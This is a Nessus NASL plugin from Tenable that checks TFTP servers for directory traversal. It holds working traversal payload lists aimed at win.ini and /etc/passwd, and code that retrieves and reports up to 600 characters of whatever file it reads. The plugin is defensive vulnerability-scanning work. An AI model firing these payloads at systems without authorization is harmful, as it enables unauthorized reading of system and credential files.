#
# (C) Tenable Network Security, Inc.
#

# This script replaces the old C plugin "tftp_grab_file".
#
# References:
# From:	Luigi Auriemma <aluigi@autistici.org>
# To:	bugtraq@securityfocus.com, full-disclosure@lists.grok.org.uk,
#	packet@packetstormsecurity.org,cert@cert.org,news@securiteam.com
# Date:	Wed, Apr 2, 2008 at 8:42 PM
# Subject: Directory traversal in LANDesk Management Suite 8.80.1.1
#
# From:	Luigi Auriemma <aluigi@autistici.org>
# To:	bugtraq@securityfocus.com,full-disclosure@lists.grok.org.uk,
#	packet@packetstormsecurity.org,cert@cert.org,news@securiteam.com,
# Date:	Mon, Mar 31, 2008 at 9:48 PM
# Subject: Directory traversal in 2X ThinClientServer v5.0_sp1-r3497
#

include("compat.inc");

if (description)
{
  script_id(18262);
  script_version("$Revision: 1.50 $");
  script_cvs_date("$Date: 2016/11/23 20:42:24 $");

  script_cve_id(
    "CVE-1999-0183",
    "CVE-1999-0498",
    "CVE-2002-2353",
    "CVE-2009-0271",
    "CVE-2009-0288",
    "CVE-2009-1161"
  );
  script_bugtraq_id(
    6198,
    11582,
    11584,
    33287,
    33344,
    35040,
    42907,
    48272,
    50441,
    52938
  );
  script_osvdb_id(
    8069,
    11221,
    11297,
    11349,
    51404,
    51487,
    54616,
    57701,
    76743,
    80984
  );
  script_xref(name:"EDB-ID", value:"14857");
  script_xref(name:"EDB-ID", value:"17507");
  script_xref(name:"EDB-ID", value:"18718");

  script_name(english:"TFTP Traversal Arbitrary File Access");
  script_summary(english:"Attempts to grab a file through TFTP");

  script_set_attribute(attribute:"synopsis", value:
"The remote TFTP server can be used to read arbitrary files on the
remote host.");
  script_set_attribute(attribute:"description", value:
"The TFTP (Trivial File Transfer Protocol) server running on the remote
host is vulnerable to a directory traversal attack that allows an
attacker to read arbitrary files on the remote host by prepending
their names with directory traversal sequences.");
  script_set_attribute(attribute:"solution", value:
"Disable the remote TFTP daemon, run it in a chrooted environment, or
filter incoming traffic to this port.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Distinct TFTP 3.10 Writable Directory Traversal Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:'D2ExploitPack');
  script_cwe_id(22, 264);

  script_set_attribute(attribute:"vuln_publication_date", value:"1986/04/19");
  script_set_attribute(attribute:"plugin_publication_date", value:"2005/05/16");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2005-2016 Tenable Network Security, Inc.");
  script_family(english:"Misc.");

  # Warning! We cannot depend on tftpd_backdoor!
  script_dependencies('tftpd_detect.nasl', "os_fingerprint.nasl");
  script_require_keys("Services/udp/tftp");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("dump.inc");
include("tftp.inc");
include("misc_func.inc");


if(islocalhost()) exit(0, "This plugin does not run against the localhost.");	# ?
if ( TARGET_IS_IPV6 ) exit(0, "This plugin does not run over IPv6.");

global_var	nb;
function tftp_grab(port, file)
{
 local_var	req, rep, sport, ip, u, filter, data, i;

 req = '\x00\x01'+file+'\0netascii\0';
 sport = rand() % 64512 + 1024;

 ip = forge_ip_packet(ip_hl : 5, ip_v: 4,  ip_tos:0,
	ip_len:20, ip_off:0, ip_ttl:64, ip_p:IPPROTO_UDP,
	ip_src: this_host());

 u = forge_udp_packet(ip:ip, uh_sport: sport, uh_dport:port, uh_ulen: 8 + strlen(req), data:req);

 filter = 'udp and dst port ' + sport + ' and src host ' + get_host_ip() + ' and udp[8:1]=0x00';

 data = NULL;
 for (i = 0; i < 2; i ++)	# Try twice
 {
  rep = send_packet(u, pcap_active:TRUE, pcap_filter:filter);
  if(rep)
  {
   if (debug_level > 2) dump(ddata: rep, dtitle: 'TFTP (IP)');
   data = get_udp_element(udp: rep, element:"data");
   if (debug_level > 1) dump(ddata: data, dtitle: 'TFTP (UDP)');
   if (data[0] == '\0' && data[1] == '\x03')
   {
     local_var	c;
     c = substr(data, 4);
     # debug_print('Content of ',file, "= ", c, '\n'r);
     set_kb_item(name: 'tftp/'+port+'/filename/'+ nb, value: file);
     set_kb_item(name: 'tftp/'+port+'/filecontent/'+ nb, value: c);
     nb ++;
     return c;
   }
   else
     return NULL;
  }
 }
 return NULL;
}

port = get_kb_item('Services/udp/tftp');
if (! port) port = 69;
nb = 0;

if (!get_udp_port_state(port)) audit(AUDIT_PORT_CLOSED, port, "UDP");


exploits = make_array();
exploits['windows'] = make_list(
  "win.ini",
  "Windows/win.ini",
  "WINNT/win.ini",
  "/Windows/win.ini",
  "/WINNT/win.ini",
  mult_str(str:"../", nb:10) + "Windows/win.ini",
  mult_str(str:"../", nb:10) + "WINNT/win.ini",
  mult_str(str:".../", nb:10) + "Windows/win.ini",
  mult_str(str:".../", nb:10) + "WINNT/win.ini",
  "x/" + mult_str(str:"../", nb:10) + "Windows/win.ini",
  "x/" + mult_str(str:"../", nb:10) + "WINNT/win.ini",
  "x/Windows/win.ini",
  "x/WINNT/win.ini",
  "C:/Windows/win.ini",
  "C:/WINNT/win.ini",
  "Windows\win.ini",
  "WINNT\win.ini",
  "\Windows\win.ini",
  "\WINNT\win.ini",
  mult_str(str:"..\", nb:10) + "Windows\win.ini",
  mult_str(str:"..\", nb:10) + "WINNT\win.ini",
  mult_str(str:"...\", nb:10) + "Windows\win.ini",
  mult_str(str:"...\", nb:10) + "WINNT\win.ini",
  "x\" + mult_str(str:"..\", nb:10) + "Windows\win.ini",
  "x\" + mult_str(str:"..\", nb:10) + "WINNT\win.ini",
  "x\Windows\win.ini",
  "x\WINNT\win.ini",
  "C:\Windows\win.ini",
  "C:\WINNT\win.ini"
);
exploits['nix'] = make_list(
  "/etc/passwd",
  mult_str(str:"../", nb:10) + "etc/passwd"
);

vulns = make_list();
obtained_contents = "";
obtained_file = "";

os = get_kb_item("Host/OS");

foreach os_type (keys(exploits))
{
  # Run all exploits in paranoid mode
  # otherwise just for the detected OS
  if (!isnull(os) && report_paranoia < 2)
  {
    if ("windows" >< tolower(os) && os_type != "windows") continue;
    if ("windows" >!< tolower(os) && os_type == "windows") continue;
  }

  exploit_list = exploits[os_type];

  foreach file (exploit_list)
  {
    # Try using netascii mode.
    f = tftp_grab(port: port, file: file);
    # If that failed, try octet mode.
    if (isnull(f)) f = tftp_get(port:port, path:file);
    if (f)
    {
      # Check contents
      if (
        ("win.ini" >< file && "; for 16-bit app support" >< f) ||
        ("win.ini" >< file && "[Mail]" >< f) ||
        (f =~ "root:.*:0:[01]:")
      )
      {
        vulns = make_list(vulns, file);
        obtained_file = file;
        if (strlen(f) > 600)
          obtained_contents = substr(f, 0, 600);
        else
          obtained_contents = f;

        if (!thorough_tests) break;
      }
    }
  }
  if (max_index(vulns) && !thorough_tests) break;
}

if (max_index(vulns))
{
  if (report_verbosity > 0)
  {
    vulns = list_uniq(vulns);
    foreach vuln (vulns)
      successful_attempts += '\n  '+vuln;

    report =
      '\n' + 'Nessus was able to access a system file via the TFTP server' +
      '\n' + 'using each of the following requests : ' +
      '\n' +
      successful_attempts +
      '\n';

    if (
      !defined_func("nasl_level") ||
      nasl_level() < 5200 ||
      !isnull(get_preference("sc_version"))
    )
    {
      report +=
        '\n' + 'Here is the contents of the file Nessus was able to obtain :' +
        '\n' + snip +
        '\n' + obtained_contents +
        '\n' + snip +
        '\n';
      security_warning(port:port, proto:"udp", extra:report);
    }
    else
    {
      # Sanitize file names
      if ("/" >< obtained_file) obtained_file = ereg_replace(pattern:"^.+/([^/]+)$", replace:"\1", string:obtained_file);
      else if ("\" >< obtained_file) obtained_file = ereg_replace(pattern:"^.+\\([^\\]+)$", replace:"\1", string:obtained_file);

      report +=
        '\n' + 'Attached is a copy of the contents' + '\n';

      attachments = make_list();
      attachments[0] = make_array();
      attachments[0]["type"] = "text/plain";
      attachments[0]["name"] = obtained_file;
      attachments[0]["value"] = obtained_contents;

      security_report_with_attachments(
        port  : port,
        proto : "udp",
        level : 2,
        extra : report,
        attachments : attachments
      );
    }
  }
  else security_warning(port:port, proto:"udp");
}
else audit(AUDIT_LISTEN_NOT_VULN, "TFTP server", port);
